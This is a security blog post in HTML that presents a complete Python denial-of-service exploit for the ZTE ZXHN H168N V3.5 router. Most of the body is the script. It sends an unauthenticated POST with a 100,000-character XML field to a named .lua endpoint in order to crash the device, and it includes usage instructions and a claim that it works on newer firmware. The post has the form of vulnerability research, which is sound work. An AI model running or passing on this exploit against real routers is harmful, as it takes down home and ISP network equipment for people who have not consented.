<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Exploit Writing (KILLx108): Kill ZTE Router  - Zeyad Azima</title>
<meta name="description" content="Exploit for unknown vulnerability in ZXHN H168N V3.5 to kill the device with one request. ">


  <meta name="author" content="Zeyad Azima">


<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="Zeyad Azima">
<meta property="og:title" content="Exploit Writing (KILLx108): Kill ZTE Router">
<meta property="og:url" content="http://localhost:5000/iot%20exploitation/exploitzte/">


  <meta property="og:description" content="Exploit for unknown vulnerability in ZXHN H168N V3.5 to kill the device with one request. ">



  <meta property="og:image" content="http://localhost:5000/assets/images/clchdo96yeclu0jp8gj7mf54a.png">





  <meta property="article:published_time" content="2023-01-05T00:00:00+08:00">





  

  


<link rel="canonical" href="http://localhost:5000/iot%20exploitation/exploitzte/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "Zeyad Azima",
      "url": "http://localhost:5000/"
    
  }
</script>






<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Zeyad Azima Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

<!-- favicon -->
<link rel="icon" type="image/png" sizes="32x32" href="/assets/images/site_data/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/images/site_data/favicon-16x16.png">
<meta name="theme-color" content="#ffffff">

  </head>

  <body class="layout--single wide">
    <nav class="skip-links">
  <h2 class="screen-reader-text">Skip links</h2>
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/site_data/logo.png" alt=""></a>
        
        <a class="site-title" href="/">
          Zeyad Azima
          
        </a>
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/categories/#Security-Research">Security Research</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/#MacOS">MacOS</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/#IoT-Exploitation">IoT Exploitation</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/#Defense-Evasion">Defense Evasion</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/#General">General</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/#Certificates">Certificates</a>
            </li><li class="masthead__menu-item">
              <a href="/categories">All Categories</a>
            </li></ul>
        
        <button class="search__toggle" type="button">
          <span class="visually-hidden">Toggle search</span>
          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
          </svg>
        </button>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      
        <img src="/assets/images/site_data/avatar.jpg" alt="Zeyad Azima" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">Zeyad Azima</h3>
    
    
      <div class="author__bio" itemprop="description">
        <p>Brain Storming Stuff (Exploit Development, Reverse Engineering &amp; More)</p>

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      

      
        
          
            <li><a href="mailto:contact@zeyadazima.com" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span></a></li>
          
        
          
            <li><a href="https://twitter.com/AzimaZeyad" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
          
        
          
            <li><a href="https://www.linkedin.com/in/zer0verflow/" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
          
        
          
            <li><a href="https://github.com/Zeyad-Azima" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
          
        
          
            <li><a href="https://www.buymeacoffee.com/zeyadazima" rel="nofollow noopener noreferrer"><i class="fas fa-mug-hot" aria-hidden="true"></i><span class="label">Buy Me a Coffee</span></a></li>
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>



  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Exploit Writing (KILLx108): Kill ZTE Router">
    <meta itemprop="description" content="IntroductionAfter we had a lot  of information and understand where is the bug in the previous research (You can read it from here). Now, It’s time to exploit it and create an exploit.">
    <meta itemprop="datePublished" content="2023-01-05T00:00:00+08:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">Exploit Writing (KILLx108): Kill ZTE Router
</h1>
          
            <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  3 minute read

</p>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
              <ul class="toc__menu">
  <li><a href="#introduction">Introduction</a></li>
  <li><a href="#the-exploit">The Exploit</a></li>
  <li><a href="#conclusion">Conclusion</a></li>
</ul>

            </nav>
          </aside>
        
        <h1 id="introduction">Introduction</h1>
<p>After we had a lot  of information and understand where is the bug in the previous research (You can read it from <a href="https://zeyadazima.com/defense%20evasion/portspoof/">here</a>). Now, It’s time to exploit it and create an exploit.</p>

<h1 id="the-exploit">The Exploit</h1>
<p>It’s time to explain how to exploit it. So, previously it seems to be parsing the <code class="language-plaintext highlighter-rouge">XML</code> request we send and exposing information about <code class="language-plaintext highlighter-rouge">Objects/Parameters</code> and their values. and whatever <code class="language-plaintext highlighter-rouge">XML</code>  request we send it’s back with the same information. But, even tho we can not access these information if we are not authenticated. But, It’s still parsing our request if we are not authenticated. So, Let’s try our large value again here. And if we did that we will triage a crash in the router.</p>

<ul>
  <li>First we imported the needed libraries we going to use
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import random
import string
import sys
import urllib3
import requests
</code></pre></div>    </div>
  </li>
  <li><code class="language-plaintext highlighter-rouge">requests</code>: to send our request exploit to the target.</li>
  <li><code class="language-plaintext highlighter-rouge">urllib3</code>: I used it here to diable the warings.</li>
  <li><code class="language-plaintext highlighter-rouge">sys</code>: to take arguments from the user through the command line.</li>
  <li><code class="language-plaintext highlighter-rouge">string</code>: to use it for the random library in generating the payload.</li>
  <li><code class="language-plaintext highlighter-rouge">random</code>: to create a payload with random strings from the <code class="language-plaintext highlighter-rouge">strings</code> library.
<br /></li>
  <li>Second part a function taking 2 arguments
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def attack(target, porot):

  url = f"{porot}://{target}/common_page/Localnet_WlanBasicAd_WLANSSIDConf_EncryOption_lua.lua"
  try:
      print("[+] Check if the target is alive")
      check = requests.get(url, timeout=10, verify=False)
      if check.status_code == 200 or 301 or 302 or 303:
          print("[+] Target is alive")
          print("[+] Sending request...")
          create = string.ascii_uppercase
          payload = ''.join(random.choice(create) for i in range(100000))
          cookies = {"_TESTCOOKIESUPPORT": "1"}
          Headers = {"Connection": "close",
                     "sec-ch-ua": "\"Google Chrome\";v=\"87\", \" Not;A Brand\";v=\"99\", \"Chromium\";v=\"87\"",
                     "Accept": "application/xml, text/xml, */*; q=0.01", "X-Requested-With": "XMLHttpRequest",
                     "sec-ch-ua-mobile": "?0",
                     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
                     "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                     "Origin": "https://192.168.1.1", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors",
                     "Sec-Fetch-Dest": "empty", "Referer": "https://"+target+"/", "Accept-Encoding": "gzip, deflate",
                     "Accept-Language": "en-US,en;q=0.9"}
          Data = f"&lt;ajax_response_xml_root&gt;&lt;INSTIDENTITY&gt;{payload}&lt;/INSTIDENTITY&gt;&lt;/ajax_response_xml_root&gt;"
</code></pre></div>    </div>
  </li>
</ul>

<p>Basically, This function will take 2 arguments which is <code class="language-plaintext highlighter-rouge">protocol</code>, ethier is <code class="language-plaintext highlighter-rouge">http</code> or <code class="language-plaintext highlighter-rouge">https</code> and the <code class="language-plaintext highlighter-rouge">target</code> you want to exploit it. Then, it will check if the target alive and responded or no. After that in the following lines:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>create = string.ascii_uppercase
payload = ''.join(random.choice(create) for i in range(100000))
</code></pre></div></div>
<p>it will create a random <code class="language-plaintext highlighter-rouge">100000</code> length of strings to send it with the request and crash the device.</p>

<ul>
  <li>Full code:
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code></code></pre></div>    </div>
    <p>import random
import string
import sys
import urllib3
import requests</p>
  </li>
</ul>

<p>urllib3.disable_warnings()</p>

<p>def attack(target, porot):</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>url = f"{porot}://{target}/common_page/Localnet_WlanBasicAd_WLANSSIDConf_EncryOption_lua.lua"
try:
    print("[+] Check if the target is alive")
    check = requests.get(url, timeout=10, verify=False)
    if check.status_code == 200 or 301 or 302 or 303:
        print("[+] Target is alive")
        print("[+] Sending your request...")
        create = string.ascii_uppercase
        payload = ''.join(random.choice(create) for i in range(100000))
        cookies = {"_TESTCOOKIESUPPORT": "1"}
        Headers = {"Connection": "close",
                   "sec-ch-ua": "\"Google Chrome\";v=\"87\", \" Not;A Brand\";v=\"99\", \"Chromium\";v=\"87\"",
                   "Accept": "application/xml, text/xml, */*; q=0.01", "X-Requested-With": "XMLHttpRequest",
                   "sec-ch-ua-mobile": "?0",
                   "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
                   "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                   "Origin": "https://192.168.1.1", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors",
                   "Sec-Fetch-Dest": "empty", "Referer": "https://"+target+"/", "Accept-Encoding": "gzip, deflate",
                   "Accept-Language": "en-US,en;q=0.9"}
        Data = f"&lt;ajax_response_xml_root&gt;&lt;INSTIDENTITY&gt;{payload}&lt;/INSTIDENTITY&gt;&lt;/ajax_response_xml_root&gt;"
        try:
            att = requests.post(url, headers=Headers, cookies=cookies, data=Data, verify=False, timeout=5)
            print("[-] Target is not Vulnerable")
            sys.exit()
        except requests.exceptions.Timeout:
            print("[+] Target vulnerable and dead now")

        print("[+] Exploit by: Zeyad Azima")

    else:
        print("[-] Your Target is not Alive")
except Exception as error:
    print("[-]", error)
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code></code></pre></div></div>
<p>try:
    if sys.argv[2] == “http” or “https”:
        attack(sys.argv[1], sys.argv[2])
    else:
        print(“[-] Please enter a valid protocol (http or https)”)</p>

<p>except IndexError:
    print(“[-] Please Set your target \n ex: exploit.py target protocol”)</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
- Usage
</code></pre></div></div>
<p>python3 exploit.py IP http/s
```</p>

<p><img src="/assets/images/7af704b3c8e1921061c437d260c30ccf.png" alt="7af704b3c8e1921061c437d260c30ccf.png" /></p>

<h1 id="conclusion">Conclusion</h1>
<p>At the end, it was a simple bug, But it’s lead to take the device down. The exploit works with the other new and updated versions. You can see the full code here on github.</p>

        
      </section>

      <footer class="page__meta">
        
        


  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#iot-exploitation" class="page__taxonomy-item" rel="tag">IoT Exploitation</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2023-01-05T00:00:00+08:00">January 5, 2023</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/defense%20evasion/BypassAV2/" class="pagination--pager" title="Bypass The Anti-Virus - Part 2: Common Misconfigurations, Techniques &amp; Attacks
">Previous</a>
    
    
      <a href="/iot%20exploitation/killzte/" class="pagination--pager" title="Research: Kill the Router with one request
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
</div>

    </div>

    
      <div class="search-content">
        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
    <label class="sr-only" for="search">
      Enter your search term...
    </label>
    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
  </form>
  <div id="results" class="results"></div></div>

      </div>
    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    
      <li><strong>Follow:</strong></li>
    

    
      
        
      
        
      
        
      
        
      
        
      
        
      
    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2024 Zeyad Azima. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>




<script src="/assets/js/lunr/lunr.min.js"></script>
<script src="/assets/js/lunr/lunr-store.js"></script>
<script src="/assets/js/lunr/lunr-en.js"></script>







  </body>
</html>
